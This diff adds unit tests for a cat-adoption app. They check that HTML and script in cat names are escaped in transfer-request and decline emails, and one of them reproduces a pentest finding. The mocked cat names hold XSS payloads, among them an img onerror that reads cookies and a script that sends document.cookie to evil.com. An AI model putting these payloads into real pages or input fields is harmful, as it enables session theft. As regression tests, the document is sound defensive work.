@@ -389,6 +389,41 @@ describe("handleRequestTransfer - HTML injection mitigation", () => {
       "A".repeat(500), // Trimmed and limited to 500
     );
   });
+
+  it("escapes HTML in cat name in email subject line", async () => {
+    mockGetCatPublicProfile.mockResolvedValue({
+      public_id: "MP-MX-0000-0001",
+      name: '<script>alert("xss")</script>Mittens',
+      current_mode: "adoption",
+      country_code: "MX",
+      photo_r2_key: null,
+    });
+    mockHasPendingTransferRequest.mockResolvedValue(false);
+    mockInsertTransferRequest.mockResolvedValue(123);
+    mockFindOwnerById.mockImplementation((db: unknown, ownerId: number) => {
+      if (ownerId === 1) return Promise.resolve({ id: 1, email: "requester@example.com" });
+      if (ownerId === 2) return Promise.resolve({ id: 2, email: "owner@example.com" });
+      return Promise.resolve(null);
+    });
+
+    const res = await handleRequestTransfer(
+      jsonRequest({ message: "I want to adopt" }),
+      "MP-MX-0000-0001",
+      fakeDb,
+      requester,
+      RESEND_API_KEY,
+      PUBLIC_BASE_URL,
+    );
+
+    expect(res.status).toBe(201);
+    expect(mockSendEmail).toHaveBeenCalledTimes(1);
+    
+    const emailPayload = mockSendEmail.mock.calls[0][0];
+    // Verify subject line escapes HTML
+    expect(emailPayload.subject).toContain("&lt;script&gt;");
+    expect(emailPayload.subject).not.toContain("<script>");
+    expect(emailPayload.subject).toContain("Mittens");
+  });
 });
 
 // ---------------------------------------------------------------------------
@@ -505,6 +540,97 @@ describe("handleDeclineTransfer - HTML injection mitigation", () => {
     expect(emailPayload.html).toContain("&lt;style&gt;");
     expect(emailPayload.html).toContain("&lt;/style&gt;");
     expect(emailPayload.html).not.toContain("<style>");
+  });
+
+  it("prevents stored HTML injection via cat name in decline email (pentest scenario)", async () => {
+    // This test reproduces the exact pentest finding:
+    // An attacker creates a cat with HTML in the name, then when a transfer
+    // request is declined, that HTML should be escaped in the email sent to the requester.
+    mockGetTransferRequest.mockResolvedValue({
+      id: 456,
+      cat_public_id: "MP-MX-0000-0002",
+      requester_owner_id: 3,
+      current_owner_id: 2,
+      message: null,
+      status: "pending",
+    });
+    mockResolveTransferRequest.mockResolvedValue(undefined);
+    mockFindOwnerById.mockResolvedValue({ id: 3, email: "victim@example.com" });
+    
+    // Attacker-controlled cat name with HTML injection payload
+    mockGetCatPublicProfile.mockResolvedValue({
+      public_id: "MP-MX-0000-0002",
+      name: '<img src=x onerror=alert(document.cookie)>MaliciousCat',
+      current_mode: "adoption",
+      country_code: "MX",
+      photo_r2_key: null,
+    });
+
+    const res = await handleDeclineTransfer(
+      456,
+      fakeDb,
+      owner,
+      RESEND_API_KEY,
+    );
+
+    expect(res.status).toBe(200);
+    expect(mockSendEmail).toHaveBeenCalledTimes(1);
+    
+    const emailPayload = mockSendEmail.mock.calls[0][0];
+    
+    // Verify the HTML is escaped in the email body
+    expect(emailPayload.html).toContain("&lt;img src=x onerror=alert(document.cookie)&gt;");
+    // Verify the raw HTML tag is NOT present (would be exploitable)
+    expect(emailPayload.html).not.toContain("<img src=x");
+    // Verify the tag is properly closed with escaped bracket
+    expect(emailPayload.html).not.toContain("onerror=alert(document.cookie)>");
+    
+    // Verify the email is sent to the requester (victim)
+    expect(emailPayload.to).toBe("victim@example.com");
+    
+    // Verify the subject line contains expected text
+    expect(emailPayload.subject).toContain("Adoption request update");
+  });
+
+  it("escapes HTML in cat name with script tags in decline email", async () => {
+    mockGetTransferRequest.mockResolvedValue({
+      id: 789,
+      cat_public_id: "MP-MX-0000-0003",
+      requester_owner_id: 4,
+      current_owner_id: 2,
+      message: null,
+      status: "pending",
+    });
+    mockResolveTransferRequest.mockResolvedValue(undefined);
+    mockFindOwnerById.mockResolvedValue({ id: 4, email: "user@example.com" });
+    
+    // Cat name with script tag injection attempt
+    mockGetCatPublicProfile.mockResolvedValue({
+      public_id: "MP-MX-0000-0003",
+      name: '<script>fetch("https://evil.com/steal?data="+document.cookie)</script>Fluffy',
+      current_mode: "adoption",
+      country_code: "MX",
+      photo_r2_key: null,
+    });
+
+    const res = await handleDeclineTransfer(
+      789,
+      fakeDb,
+      owner,
+      RESEND_API_KEY,
+    );
+
+    expect(res.status).toBe(200);
+    expect(mockSendEmail).toHaveBeenCalledTimes(1);
+    
+    const emailPayload = mockSendEmail.mock.calls[0][0];
+    
+    // Verify script tags are escaped
+    expect(emailPayload.html).toContain("&lt;script&gt;");
+    expect(emailPayload.html).toContain("&lt;/script&gt;");
+    expect(emailPayload.html).not.toContain("<script>");
+    expect(emailPayload.html).not.toContain("</script>");
+    expect(emailPayload.html).not.toContain('fetch("https://evil.com');
   });
 
   it("returns 404 when transfer request does not exist", async () => {
